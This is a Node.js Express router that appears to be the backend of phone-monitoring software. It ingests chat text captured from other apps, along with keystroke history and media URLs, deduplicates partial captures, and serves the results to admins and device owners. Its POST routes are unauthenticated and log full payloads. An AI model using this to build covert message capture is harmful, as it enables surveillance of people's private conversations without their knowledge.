const express = require('express');
const router = express.Router();
const { getDb } = require('../database/mongodb');
const websocketService = require('../services/websocketService');
const { authenticate, optionalAuth } = require('../middleware/auth');
const fileLogger = require('../utils/logger');

const SUBSET_MATCH_WINDOW_MS = 2 * 60 * 1000;

function getGroupKey(chat) {
    const deviceId = chat.deviceId || 'null';
    const appPackage = chat.appPackage || 'unknown';
    const chatIdentifier = chat.chatIdentifier || chat.chatName || '';
    return `${deviceId}|${appPackage}|${chatIdentifier}`;
}

function withinWindow(a, b, windowMs) {
    return Math.abs((a || 0) - (b || 0)) <= windowMs;
}

function mergeKeyHistory(existing, incoming) {
    if (!existing && !incoming) {
        return null;
    }
    const merged = new Set();
    (existing || []).forEach(value => merged.add(value));
    (incoming || []).forEach(value => merged.add(value));
    return merged.size > 0 ? Array.from(merged) : null;
}

// POST /api/chats - Single chat
router.post('/', async (req, res) => {
    try {
        const chat = req.body;
        
        // Log chat payload to file
        fileLogger.logChat(chat);
        
        // Validate required fields
        if (!chat.id || !chat.appPackage || !chat.appName || !chat.text) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        const db = getDb();
        const existing = await db.collection('chats').findOne({ id: chat.id });
        const timestamp = chat.timestamp || Date.now();
        const subsetCandidates = await db.collection('chats').find({
            deviceId: chat.deviceId || null,
            appPackage: chat.appPackage,
            chatIdentifier: chat.chatIdentifier || null,
            timestamp: {
                $gte: timestamp - SUBSET_MATCH_WINDOW_MS,
                $lte: timestamp + SUBSET_MATCH_WINDOW_MS
            }
        }, {
            projection: {
                id: 1,
                text: 1,
                timestamp: 1,
                keyHistory: 1
            }
        }).toArray();

        const existingSuperset = subsetCandidates.find(candidate =>
            candidate.text &&
            candidate.text.length >= chat.text.length &&
            candidate.text.includes(chat.text) &&
            withinWindow(candidate.timestamp, timestamp, SUBSET_MATCH_WINDOW_MS)
        );

        if (existingSuperset && existingSuperset.id !== chat.id) {
            return res.json({
                success: true,
                message: 'Chat already saved with more complete text',
                mergedWith: existingSuperset.id
            });
        }

        const subsetCandidate = subsetCandidates
            .filter(candidate =>
                candidate.text &&
                chat.text.includes(candidate.text) &&
                withinWindow(candidate.timestamp, timestamp, SUBSET_MATCH_WINDOW_MS)
            )
            .sort((a, b) => (b.text || '').length - (a.text || '').length)[0];

        if (subsetCandidate && subsetCandidate.id !== chat.id) {
            chat.id = subsetCandidate.id;
            chat.timestamp = Math.min(timestamp, subsetCandidate.timestamp || timestamp);
            chat.keyHistory = mergeKeyHistory(subsetCandidate.keyHistory, chat.keyHistory);
        } else {
            chat.timestamp = timestamp;
        }

        const iconUrl = chat.iconUrl || (existing && existing.iconUrl) || null;
        const chatName = chat.chatName || chat.chatIdentifier || (existing && existing.chatName) || null;
        const chatDoc = {
            id: chat.id,
            deviceId: chat.deviceId || null,
            appPackage: chat.appPackage,
            appName: chat.appName,
            chatIdentifier: chat.chatIdentifier || null,
            chatName: chatName,
            text: chat.text,
            keyHistory: chat.keyHistory || null,
            mediaUrls: chat.mediaUrls || null,
            iconUrl: iconUrl,
            timestamp: chat.timestamp || Date.now(),
            synced: true, // Mark as synced
            syncAttempts: 0,
            lastSyncAttempt: null,
            errorMessage: null,
            createdAt: Math.floor(Date.now() / 1000)
        };
        
        // Use replaceOne with upsert for INSERT OR REPLACE behavior
        await db.collection('chats').replaceOne(
            { id: chat.id },
            chatDoc,
            { upsert: true }
        );
        
        // Broadcast WebSocket update
        if (chat.deviceId) {
            websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
        }
        
        res.json({
            success: true,
            message: 'Chat saved successfully'
        });
    } catch (error) {
        console.error('Error saving chat:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving chat'
        });
    }
});

// POST /api/chats/batch - Batch chats
router.post('/batch', async (req, res) => {
    try {
        const chats = req.body;
        
        // Log batch chat payloads to file
        chats.forEach(chat => {
            fileLogger.logChat(chat);
        });
        
        if (!Array.isArray(chats) || chats.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'Invalid batch data'
            });
        }

        const invalidChats = [];
        const validChats = chats.filter(chat => {
            const isValid = chat && chat.id && chat.appPackage && chat.appName && chat.text;
            if (!isValid) {
                invalidChats.push(chat);
            }
            return isValid;
        });

        if (invalidChats.length > 0) {
            console.warn(`Batch validation: ${invalidChats.length} invalid chats skipped`);
        }

        if (validChats.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'No valid chats to save',
                invalidCount: invalidChats.length
            });
        }
        
        const db = getDb();
        
        // Deduplicate chats before processing
        // Strategy: Remove duplicates based on content (appPackage + text + timestamp within 5 seconds)
        const seenContent = new Map(); // key: appPackage|text|timeBucket, value: chat
        const uniqueChats = [];
        const duplicateIds = [];
        
        validChats.forEach(chat => {
            // Create content key: appPackage + text + timestamp bucket (5 second window)
            const timeBucket = Math.floor((chat.timestamp || Date.now()) / 5000);
            const contentKey = `${chat.deviceId || 'null'}|${chat.appPackage || 'unknown'}|${chat.chatIdentifier || ''}|${chat.text || ''}|${timeBucket}`;
            
            // Check if we've seen this content before
            if (seenContent.has(contentKey)) {
                // Duplicate found - keep the one with the earlier timestamp or existing ID
                const existing = seenContent.get(contentKey);
                if (chat.timestamp < existing.timestamp || 
                    (chat.timestamp === existing.timestamp && chat.id && !existing.id)) {
                    // Replace with this one (earlier timestamp or has ID)
                    const index = uniqueChats.findIndex(c => c === existing);
                    if (index !== -1) {
                        uniqueChats[index] = chat;
                        seenContent.set(contentKey, chat);
                        duplicateIds.push(existing.id);
                    }
                } else {
                    duplicateIds.push(chat.id);
                }
            } else {
                // New unique content
                seenContent.set(contentKey, chat);
                uniqueChats.push(chat);
            }
        });
        
        // Also deduplicate by ID within the batch (in case same ID appears multiple times)
        const seenIds = new Set();
        const finalChats = uniqueChats.filter(chat => {
            if (chat.id && seenIds.has(chat.id)) {
                duplicateIds.push(chat.id);
                return false;
            }
            if (chat.id) {
                seenIds.add(chat.id);
            }
            return true;
        });
        
        console.log(`Batch deduplication: ${validChats.length} total, ${finalChats.length} unique, ${duplicateIds.length} duplicates removed`);
        
        if (finalChats.length === 0) {
            return res.json({
                success: true,
                message: 'All chats were duplicates, nothing to save',
                duplicatesRemoved: duplicateIds.length
            });
        }

        const ids = finalChats.map(chat => chat.id).filter(Boolean);
        const existingChats = ids.length
            ? await db.collection('chats').find({ id: { $in: ids } }).toArray()
            : [];
        const existingIconMap = new Map(existingChats.map(c => [c.id, c.iconUrl]));
        const existingNameMap = new Map(existingChats.map(c => [c.id, c.chatName]));
        
        // Subset update: if older text is a subset of newer text, update the older record
        const grouped = new Map();
        finalChats.forEach(chat => {
            const key = getGroupKey(chat);
            const timestamp = chat.timestamp || Date.now();
            if (!grouped.has(key)) {
                grouped.set(key, {
                    deviceId: chat.deviceId || null,
                    appPackage: chat.appPackage,
                    chatIdentifier: chat.chatIdentifier || null,
                    min: timestamp,
                    max: timestamp
                });
            } else {
                const group = grouped.get(key);
                group.min = Math.min(group.min, timestamp);
                group.max = Math.max(group.max, timestamp);
            }
        });

        const candidatePool = new Map();
        for (const [key, group] of grouped.entries()) {
            const recentChats = await db.collection('chats').find({
                deviceId: group.deviceId,
                appPackage: group.appPackage,
                chatIdentifier: group.chatIdentifier,
                timestamp: {
                    $gte: group.min - SUBSET_MATCH_WINDOW_MS,
                    $lte: group.max + SUBSET_MATCH_WINDOW_MS
                }
            }, {
                projection: {
                    id: 1,
                    text: 1,
                    timestamp: 1,
                    keyHistory: 1
                }
            }).toArray();
            candidatePool.set(key, recentChats);
        }

        const subsetMergedChats = [];
        let subsetUpdated = 0;
        let subsetSkipped = 0;
        const subsetIdsToFetch = new Set();

        const sortedChats = [...finalChats].sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
        sortedChats.forEach(chat => {
            const key = getGroupKey(chat);
            const pool = candidatePool.get(key) || [];
            const timestamp = chat.timestamp || Date.now();
            const text = chat.text || '';

            const superset = pool.find(candidate =>
                candidate.text &&
                candidate.text.length >= text.length &&
                candidate.text.includes(text) &&
                withinWindow(candidate.timestamp, timestamp, SUBSET_MATCH_WINDOW_MS)
            );

            if (superset) {
                subsetSkipped += 1;
                return;
            }

            const subsetCandidate = pool
                .filter(candidate =>
                    candidate.text &&
                    text.includes(candidate.text) &&
                    withinWindow(candidate.timestamp, timestamp, SUBSET_MATCH_WINDOW_MS)
                )
                .sort((a, b) => (b.text || '').length - (a.text || '').length)[0];

            if (subsetCandidate && subsetCandidate.id !== chat.id) {
                chat.id = subsetCandidate.id;
                chat.timestamp = Math.min(timestamp, subsetCandidate.timestamp || timestamp);
                chat.keyHistory = mergeKeyHistory(subsetCandidate.keyHistory, chat.keyHistory);
                subsetUpdated += 1;
                if (!existingIconMap.has(chat.id) && !existingNameMap.has(chat.id)) {
                    subsetIdsToFetch.add(chat.id);
                }
            }

            pool.push({
                id: chat.id,
                text: chat.text,
                timestamp: chat.timestamp,
                keyHistory: chat.keyHistory || null
            });
            candidatePool.set(key, pool);
            subsetMergedChats.push(chat);
        });
        
        if (subsetIdsToFetch.size > 0) {
            const fetchedSubsetChats = await db.collection('chats')
                .find({ id: { $in: Array.from(subsetIdsToFetch) } })
                .project({ id: 1, iconUrl: 1, chatName: 1 })
                .toArray();
            fetchedSubsetChats.forEach(existingChat => {
                if (!existingIconMap.has(existingChat.id)) {
                    existingIconMap.set(existingChat.id, existingChat.iconUrl || null);
                }
                if (!existingNameMap.has(existingChat.id)) {
                    existingNameMap.set(existingChat.id, existingChat.chatName || null);
                }
            });
        }

        const operations = subsetMergedChats.map(chat => {
            const iconUrl = chat.iconUrl || existingIconMap.get(chat.id) || null;
            const chatName = chat.chatName || chat.chatIdentifier || existingNameMap.get(chat.id) || null;
            
            // Ensure chat.id exists (required for upsert)
            if (!chat.id) {
                throw new Error(`Chat missing required field 'id': ${JSON.stringify(chat)}`);
            }
            
            // Ensure required fields exist
            if (!chat.appPackage || !chat.appName || !chat.text) {
                throw new Error(`Chat missing required fields (appPackage, appName, or text): ${JSON.stringify(chat)}`);
            }
            
            return {
                replaceOne: {
                    filter: { id: chat.id },
                    replacement: {
                        id: chat.id,
                        deviceId: chat.deviceId || null,
                        appPackage: chat.appPackage,
                        appName: chat.appName,
                        chatIdentifier: chat.chatIdentifier || null,
                        chatName: chatName,
                        text: chat.text,
                        keyHistory: chat.keyHistory || null,
                        mediaUrls: chat.mediaUrls || null,
                        iconUrl: iconUrl,
                        timestamp: chat.timestamp || Date.now(),
                        synced: true,
                        syncAttempts: 0,
                        lastSyncAttempt: null,
                        errorMessage: null,
                        createdAt: Math.floor(Date.now() / 1000)
                    },
                    upsert: true
                }
            };
        });
        
        if (operations.length > 0) {
            await db.collection('chats').bulkWrite(operations);
        }
        
        // Broadcast WebSocket updates for each unique chat
        subsetMergedChats.forEach(chat => {
            if (chat.deviceId) {
                websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
            }
        });
        
        res.json({
            success: true,
            message: `Saved ${subsetMergedChats.length} chats`,
            duplicatesRemoved: duplicateIds.length,
            totalReceived: chats.length,
            invalidCount: invalidChats.length,
            subsetUpdated,
            subsetSkipped
        });
    } catch (error) {
        console.error('Error saving batch:', error);
        console.error('Error stack:', error.stack);
        console.error('Batch data:', JSON.stringify(req.body, null, 2));
        res.status(500).json({
            success: false,
            message: 'Error saving batch',
            error: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
});

// GET /api/chats - Get chats (with device filtering)
router.get('/', authenticate, async (req, res) => {
    try {
        const user = req.user || {};
        const role = user.role;
        const assignedDeviceId = user.deviceId;
        const deviceId = req.query.deviceId;
        
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const skip = (page - 1) * limit;
        
        const db = getDb();
        const filter = {};
        
        // Device owners can only see chats from their assigned device
        if (role === 'device_owner' && assignedDeviceId) {
            filter.deviceId = assignedDeviceId;
        } else if (role === 'admin') {
            // Admin can filter by deviceId if provided, otherwise see all
            if (deviceId) {
            filter.deviceId = deviceId;
            }
        } else {
            // Non-admin, non-device-owner users cannot access chats
            return res.status(403).json({
                success: false,
                message: 'Access denied'
            });
        }
        
        const chats = await db.collection('chats')
            .find(filter)
            .sort({ timestamp: -1 })
            .limit(limit)
            .skip(skip)
            .toArray();
        
        // Convert synced to boolean (handle both boolean and number formats)
        const formattedChats = chats.map(chat => ({
            ...chat,
            synced: chat.synced === true || chat.synced === 1
        }));
        
        res.json({
            success: true,
            data: formattedChats
        });
    } catch (error) {
        console.error('Error fetching chats:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching chats'
        });
    }
});

module.exports = router;